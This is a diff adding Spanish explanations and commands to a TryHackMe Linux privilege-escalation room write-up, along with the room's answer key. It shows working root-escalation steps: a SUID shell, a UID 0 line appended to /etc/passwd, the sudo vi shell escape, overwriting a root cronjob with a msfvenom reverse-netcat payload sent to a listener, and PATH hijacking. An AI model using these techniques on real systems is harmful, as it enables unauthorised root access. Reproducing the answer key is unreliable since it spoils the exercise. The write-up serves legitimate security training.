@@ -17,11 +17,15 @@
 
 ### Task 1: Conexión
 
+**Explicación:** Despliegue de la máquina objetivo y conexión a la red de TryHackMe (VPN o AttackBox) para poder alcanzarla.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Despliega la máquina y conéctate a la red de TryHackMe. | `No answer needed` |
 
 ### Task 2: Comprendiendo la escalada de privilegios
+
+**Explicación:** Concepto de escalada de privilegios en Linux: pasar de un usuario normal a otro o a root aprovechando malas configuraciones o vulnerabilidades. Solo teoría.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -29,11 +33,24 @@
 
 ### Task 3: Dirección de la escalada de privilegios
 
+**Explicación:** Distinción clave: escalada *horizontal* (mismo nivel, otro usuario) vs *vertical* (a root). El resto de la sala se centra en la vertical.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Entiende la diferencia entre escalada horizontal y vertical. | `No answer needed` |
 
 ### Task 4: Enumeración
+
+**Explicación:** Con `ssh user0@TARGET` (contraseña `password`) se entra al sistema. La enumeración descubre: hostname `polobox`, 8 cuentas `user[x]` en `/etc/passwd`, 4 shells en `/etc/shells`, el cronjob `autoscript.sh` (cada 5 min) y que `/etc/passwd` quedó escribible.
+
+```bash
+ssh user0@MACHINE_IP     # password
+hostname
+grep -c "user[0-9]" /etc/passwd
+cat /etc/shells
+cat /etc/crontab
+ls -l /etc/passwd
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -47,6 +64,14 @@
 
 ### Task 5: Abusando de archivos SUID/GUID
 
+**Explicación:** En `/home/user3` destaca el binario `/home/user3/shell`, con bit SUID activo: ejecutarlo da una shell con los privilegios root (al ser SUID de root). Desde esa shell `su user8` con `password` permite cambiar de cuenta.
+
+```bash
+find / -perm -u=s 2>/dev/null
+cd /home/user3 && ./shell
+su user8      # password
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué archivo del directorio de user3 destaca sobre los demás? | `/home/user3/shell` |
@@ -54,6 +79,15 @@
 | 3 | Usa "su" para cambiarte a user8 con la contraseña "password". | `No answer needed` |
 
 ### Task 6: Explotando el kernel
+
+**Explicación:** Con `/etc/passwd` escribible se inyecta un usuario root. Se genera un hash MD5crypt con `openssl passwd -1 -salt new password`, dando `$1$new$p7ptkEKU1HnaHpRtzNizS1`. La línea completa (UID 0) es `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`; al añadirla, `su new` da root (escala *vertical*).
+
+```bash
+openssl passwd -1 -salt new password
+echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
+su new
+id
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -66,6 +100,15 @@
 
 ### Task 7: Explotando sudo
 
+**Explicación:** `sudo -l` muestra que `vi` se puede ejecutar como root sin pedir contraseña (`NOPASSWD`). Dentro de vi, `:!sh` abre una shell de root.
+
+```bash
+sudo -l
+sudo vi
+:!sh
+id
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Sal de root con "exit" y usa "su" para pasarte al usuario del laboratorio. | `No answer needed` |
@@ -74,6 +117,14 @@
 | 4 | Escribe ":!sh" para abrir una shell como root. | `No answer needed` |
 
 ### Task 8: Explotando Crontab
+
+**Explicación:** El cronjob `autoscript.sh` (en `/home/user4/Desktop`) se ejecuta como root cada 5 minutos. Como el archivo es escribible por user4, se sustituye su contenido por un payload `cmd/unix/reverse_netcat` de msfvenom (bandera `-p`) y se espera la reverse shell en `nc -lvnp 8888`.
+
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+echo '<payload>' > /home/user4/Desktop/autoscript.sh
+nc -lvnp 8888
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -88,6 +139,16 @@
 
 ### Task 9: Explotando la variable PATH
 
+**Explicación:** El script SUID de user5 invoca `ls` sin ruta absoluta. Se crea una imitación `ls` en `/tmp`: `echo "/bin/bash" > ls` y `chmod +x ls`. Con `export PATH=/tmp:$PATH` el script ejecuta nuestra imitación (secuestro del PATH), abriendo una shell root.
+
+```bash
+cd /tmp
+echo "/bin/bash" > ls
+chmod +x ls
+export PATH=/tmp:$PATH
+cd /home/user5 && ./script
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Ve al directorio home de user5 y ejecuta el archivo "script" para entender qué hace. | `No answer needed` |
@@ -100,6 +161,8 @@
 | 8 | Ejecuta de nuevo el archivo "script": deberías obtener una shell de root. | `No answer needed` |
 
 ### Task 10: Resumen
+
+**Explicación:** Repaso de todas las técnicas vistas: enumeración, SUID, abuso de sudo, cronjobs y PATH hijacking.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
